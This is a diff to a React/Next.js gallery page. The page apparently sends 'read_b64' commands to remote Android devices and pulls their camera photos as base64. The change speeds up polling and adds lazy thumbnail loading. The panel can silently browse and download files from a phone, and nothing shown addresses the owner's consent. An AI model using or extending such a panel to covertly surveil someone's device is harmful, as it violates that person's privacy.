@@ -1,6 +1,5 @@
 'use client'
-import { Suspense } from 'react'
-import { useState, useCallback, useRef } from 'react'
+import { Suspense, useState, useCallback, useRef, useEffect } from 'react'
 import Sidebar from '@/components/Sidebar'
 import { useDevice } from '@/contexts/DeviceContext'
 import {
@@ -23,25 +22,23 @@ const GALLERY_PATHS = [
 ]
 
 function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)) }
-
-interface PreviewItem { path: string; name: string; b64: string; mime: string }
-
 function getMime(name: string) {
   const ext = name.split('.').pop()?.toLowerCase() ?? 'jpeg'
   return ext === 'png' ? 'image/png' : ext === 'gif' ? 'image/gif' : ext === 'webp' ? 'image/webp' : 'image/jpeg'
 }
 
-async function smartPoll(
+interface PreviewItem { path: string; name: string; b64: string; mime: string }
+
+/* ── FAST poll: 200ms first check, 350ms interval ── */
+async function fastPoll(
   deviceId: string,
   command: string,
   sentAt: number,
-  maxAttempts = 20,
-  firstDelay = 900,
-  intervalMs = 700
+  maxAttempts = 30,
 ): Promise<string> {
-  await sleep(firstDelay)
+  await sleep(200)
   for (let i = 0; i < maxAttempts; i++) {
-    if (i > 0) await sleep(intervalMs)
+    if (i > 0) await sleep(350)
     try {
       const r = await fetch(`/api/device/result?deviceId=${deviceId}`)
       const d = await r.json()
@@ -56,16 +53,14 @@ async function smartPoll(
   return ''
 }
 
-async function smartPollListing(
+async function fastPollListing(
   deviceId: string,
   targetPath: string,
-  maxAttempts = 12,
-  firstDelay = 800,
-  intervalMs = 700
+  maxAttempts = 20,
 ): Promise<FileListing | null> {
-  await sleep(firstDelay)
+  await sleep(200)
   for (let i = 0; i < maxAttempts; i++) {
-    if (i > 0) await sleep(intervalMs)
+    if (i > 0) await sleep(350)
     try {
       const res = await fetch(`/api/device/files?deviceId=${deviceId}`)
       const data = await res.json()
@@ -75,17 +70,90 @@ async function smartPollListing(
   return null
 }
 
+/* ── Shimmer skeleton tile ── */
+function ThumbSkeleton() {
+  return (
+    <div className="aspect-square rounded-xl overflow-hidden bg-android-surface border border-android-border">
+      <div className="w-full h-full animate-pulse bg-gradient-to-br from-white/5 via-white/10 to-white/5" />
+    </div>
+  )
+}
+
+/* ── Single lazy thumbnail — loads only when it enters viewport ── */
+interface LazyThumbProps {
+  entry: FileEntry
+  filePath: string
+  cached: string | undefined
+  onVisible: (fp: string) => void
+  onClick: () => void
+}
+function LazyThumb({ entry, filePath, cached, onVisible, onClick }: LazyThumbProps) {
+  const ref = useRef<HTMLButtonElement>(null)
+  const triggered = useRef(false)
+
+  useEffect(() => {
+    const el = ref.current
+    if (!el) return
+    const obs = new IntersectionObserver(
+      ([entry]) => {
+        if (entry.isIntersecting && !triggered.current) {
+          triggered.current = true
+          onVisible(filePath)
+          obs.disconnect()
+        }
+      },
+      { rootMargin: '200px' } // pre-load 200px before entering viewport
+    )
+    obs.observe(el)
+    return () => obs.disconnect()
+  }, [filePath, onVisible])
+
+  return (
+    <button
+      ref={ref}
+      onClick={onClick}
+      className="aspect-square bg-android-surface border border-android-border rounded-xl overflow-hidden hover:border-android-blue/50 transition-all duration-150 group relative"
+    >
+      {cached ? (
+        <img
+          src={cached}
+          alt={entry.name}
+          className="w-full h-full object-cover transition-opacity duration-200"
+          loading="lazy"
+          decoding="async"
+        />
+      ) : (
+        <div className="w-full h-full flex flex-col items-center justify-center gap-1.5 animate-pulse">
+          <div className="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center">
+            <Image size={16} className="text-android-border" />
+          </div>
+          <span className="text-[9px] text-android-muted px-1 text-center leading-tight truncate w-full">{entry.name}</span>
+        </div>
+      )}
+      <div className="absolute inset-0 bg-black/0 group-hover:bg-black/20 transition-colors" />
+      {cached && (
+        <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/60 to-transparent px-1.5 py-1 opacity-0 group-hover:opacity-100 transition-opacity">
+          <p className="text-[9px] text-white truncate">{entry.name}</p>
+        </div>
+      )}
+    </button>
+  )
+}
+
 function GalleryContent() {
   const { devices, selectedId, setSelectedId, connected } = useDevice()
   const [path, setPath]           = useState('/storage/emulated/0/DCIM/Camera')
   const [listing, setListing]     = useState<FileListing | null>(null)
   const [browseLoading, setBrowseLoading] = useState(false)
   const [previews, setPreviews]   = useState<Record<string, string>>({})
-  const [thumbLoading, setThumbLoading] = useState(0)
-  const [thumbTotal, setThumbTotal]     = useState(0)
-  const [fullscreen, setFullscreen]     = useState<PreviewItem | null>(null)
+  const [loadingSet, setLoadingSet] = useState<Set<string>>(new Set())
+  const [fullscreen, setFullscreen] = useState<PreviewItem | null>(null)
   const [fsLoading, setFsLoading] = useState(false)
-  const loadingRef = useRef(false)
+
+  const pendingRef  = useRef<Set<string>>(new Set())
+  const previewsRef = useRef<Record<string, string>>({})
+
+  useEffect(() => { previewsRef.current = previews }, [previews])
 
   const sendCmd = useCallback(async (command: string): Promise<string> => {
     if (!selectedId) return ''
@@ -94,37 +162,25 @@ function GalleryContent() {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ deviceId: selectedId, command }),
     })
-    return smartPoll(selectedId, command, sentAt)
+    return fastPoll(selectedId, command, sentAt)
   }, [selectedId])
 
-  const loadThumbnails = useCallback(async (entries: FileEntry[], currentPath: string, previewsSnap: Record<string, string>) => {
-    if (!selectedId || loadingRef.current) return
-    loadingRef.current = true
-    const images = entries.filter(e => e.type === 'file' && isImage(e.name)).slice(0, 20)
-    const needed = images.filter(img => !previewsSnap[`${currentPath}/${img.name}`])
-    if (needed.length === 0) { loadingRef.current = false; return }
-
-    setThumbTotal(needed.length)
-    setThumbLoading(0)
-
-    const BATCH = 3
-    for (let i = 0; i < needed.length; i += BATCH) {
-      const batch = needed.slice(i, i + BATCH)
-      await Promise.all(batch.map(async img => {
-        const fp = `${currentPath}/${img.name}`
-        try {
-          const b64 = await sendCmd(`read_b64:${fp}`)
-          if (b64 && !b64.startsWith('ERROR')) {
-            const dataUrl = `data:${getMime(img.name)};base64,${b64.trim()}`
-            setPreviews(prev => ({ ...prev, [fp]: dataUrl }))
-          }
-        } catch {}
-        setThumbLoading(prev => prev + 1)
-      }))
-    }
-    loadingRef.current = false
-    setThumbTotal(0)
-    setThumbLoading(0)
+  /* ── Called by IntersectionObserver when thumb enters viewport ── */
+  const loadOne = useCallback(async (fp: string) => {
+    if (!selectedId) return
+    if (previewsRef.current[fp] || pendingRef.current.has(fp)) return
+    pendingRef.current.add(fp)
+    setLoadingSet(prev => new Set(prev).add(fp))
+    try {
+      const b64 = await sendCmd(`read_b64:${fp}`)
+      if (b64 && !b64.startsWith('ERROR')) {
+        const name = fp.split('/').pop() ?? ''
+        const dataUrl = `data:${getMime(name)};base64,${b64.trim()}`
+        setPreviews(prev => ({ ...prev, [fp]: dataUrl }))
+      }
+    } catch {}
+    pendingRef.current.delete(fp)
+    setLoadingSet(prev => { const s = new Set(prev); s.delete(fp); return s })
   }, [selectedId, sendCmd])
 
   const browse = useCallback(async (targetPath: string) => {
@@ -132,20 +188,18 @@ function GalleryContent() {
     setBrowseLoading(true)
     setListing(null)
     setPreviews({})
+    previewsRef.current = {}
+    pendingRef.current.clear()
     setPath(targetPath)
-    loadingRef.current = false
     try {
       await fetch('/api/device/files', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ deviceId: selectedId, path: targetPath }),
       })
-      const result = await smartPollListing(selectedId, targetPath)
-      if (result) {
-        setListing(result)
-        loadThumbnails(result.entries, targetPath, {})
-      }
+      const result = await fastPollListing(selectedId, targetPath)
+      if (result) setListing(result)
     } finally { setBrowseLoading(false) }
-  }, [selectedId, loadThumbnails])
+  }, [selectedId])
 
   const openFullscreen = async (entry: FileEntry) => {
     const fp = `${path}/${entry.name}`
@@ -158,9 +212,11 @@ function GalleryContent() {
     setFullscreen({ path: fp, name: entry.name, b64: '', mime })
     try {
       const b64 = await sendCmd(`read_b64:${fp}`)
-      const dataUrl = `data:${mime};base64,${b64.trim()}`
-      setPreviews(prev => ({ ...prev, [fp]: dataUrl }))
-      setFullscreen({ path: fp, name: entry.name, b64: b64.trim(), mime })
+      if (b64 && !b64.startsWith('ERROR')) {
+        const dataUrl = `data:${mime};base64,${b64.trim()}`
+        setPreviews(prev => ({ ...prev, [fp]: dataUrl }))
+        setFullscreen({ path: fp, name: entry.name, b64: b64.trim(), mime })
+      }
     } finally { setFsLoading(false) }
   }
 
@@ -184,12 +240,15 @@ function GalleryContent() {
     browse('/' + parts.slice(0, -1).join('/'))
   }
 
+  const loadingCount = loadingSet.size
+
   return (
     <div className="flex min-h-screen">
       <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
       <main className="flex-1 page-content overflow-y-auto">
         <div className="max-w-5xl mx-auto px-3 md:px-6 py-3 md:py-6">
 
+          {/* Header */}
           <div className="flex items-center justify-between mb-3">
             <div>
               <h2 className="text-base md:text-xl font-bold text-white flex items-center gap-2">
@@ -203,6 +262,7 @@ function GalleryContent() {
             </div>
           </div>
 
+          {/* Quick path buttons */}
           <div className="flex gap-1.5 mb-3 overflow-x-auto pb-1">
             {GALLERY_PATHS.map(({ label, path: p }) => (
               <button key={p} onClick={() => browse(p)} disabled={!connected}
@@ -212,6 +272,7 @@ function GalleryContent() {
             ))}
           </div>
 
+          {/* Breadcrumb bar */}
           <div className="bg-android-surface border border-android-border rounded-xl overflow-hidden mb-3">
             <div className="px-3 py-2 flex items-center gap-2">
               <button onClick={goUp} disabled={!connected} className="p-1.5 rounded-lg hover:bg-android-border/50 disabled:opacity-30 transition-colors">
@@ -238,6 +299,7 @@ function GalleryContent() {
             </div>
           </div>
 
+          {/* States */}
           {!connected ? (
             <div className="p-12 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
               <Image size={40} className="mx-auto mb-3 text-android-border" />
@@ -255,6 +317,7 @@ function GalleryContent() {
             </div>
           ) : (
             <>
+              {/* Folders */}
               {folderEntries.length > 0 && (
                 <div className="mb-4">
                   <p className="text-xs text-android-muted mb-2">Folders ({folderEntries.length})</p>
@@ -270,6 +333,7 @@ function GalleryContent() {
                 </div>
               )}
 
+              {/* Images */}
               {imageEntries.length === 0 ? (
                 <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
                   <Image size={32} className="mx-auto mb-3 text-android-border" />
@@ -280,27 +344,25 @@ function GalleryContent() {
                   <div className="flex items-center justify-between mb-2">
                     <p className="text-xs text-android-muted">
                       {imageEntries.length} images
-                      {thumbTotal > 0 && ` · loading ${thumbLoading}/${thumbTotal} thumbnails…`}
+                      {loadingCount > 0 && (
+                        <span className="ml-1.5 text-android-green animate-pulse">· loading {loadingCount}…</span>
+                      )}
                     </p>
-                    {thumbTotal > 0 && <RefreshCw size={12} className="text-android-muted animate-spin" />}
+                    {loadingCount > 0 && <RefreshCw size={11} className="text-android-green animate-spin" />}
                   </div>
+
                   <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-2">
                     {imageEntries.map(entry => {
                       const fp = `${path}/${entry.name}`
-                      const thumb = previews[fp]
                       return (
-                        <button key={entry.name} onClick={() => openFullscreen(entry)}
-                          className="aspect-square bg-android-surface border border-android-border rounded-xl overflow-hidden hover:border-android-blue/40 transition-colors group relative">
-                          {thumb ? (
-                            <img src={thumb} alt={entry.name} className="w-full h-full object-cover" />
-                          ) : (
-                            <div className="w-full h-full flex flex-col items-center justify-center gap-1.5">
-                              <Image size={22} className="text-android-border" />
-                              <span className="text-[9px] text-android-muted px-1 text-center leading-tight truncate w-full">{entry.name}</span>
-                            </div>
-                          )}
-                          <div className="absolute inset-0 bg-black/0 group-hover:bg-black/20 transition-colors" />
-                        </button>
+                        <LazyThumb
+                          key={entry.name}
+                          entry={entry}
+                          filePath={fp}
+                          cached={previews[fp]}
+                          onVisible={loadOne}
+                          onClick={() => openFullscreen(entry)}
+                        />
                       )
                     })}
                   </div>
@@ -311,6 +373,7 @@ function GalleryContent() {
         </div>
       </main>
 
+      {/* Fullscreen viewer */}
       {fullscreen && (
         <div className="fixed inset-0 z-50 bg-black flex flex-col" onClick={e => { if (e.target === e.currentTarget) setFullscreen(null) }}>
           <div className="flex items-center justify-between px-4 py-3 bg-black/60 backdrop-blur shrink-0">
@@ -334,8 +397,11 @@ function GalleryContent() {
                 <p className="text-white/60 text-sm">Loading image…</p>
               </div>
             ) : (
-              <img src={`data:${fullscreen.mime};base64,${fullscreen.b64}`} alt={fullscreen.name}
-                className="max-w-full max-h-full object-contain rounded-lg" />
+              <img
+                src={`data:${fullscreen.mime};base64,${fullscreen.b64}`}
+                alt={fullscreen.name}
+                className="max-w-full max-h-full object-contain rounded-lg"
+              />
             )}
           </div>
           <div className="px-4 py-2 bg-black/60 shrink-0">
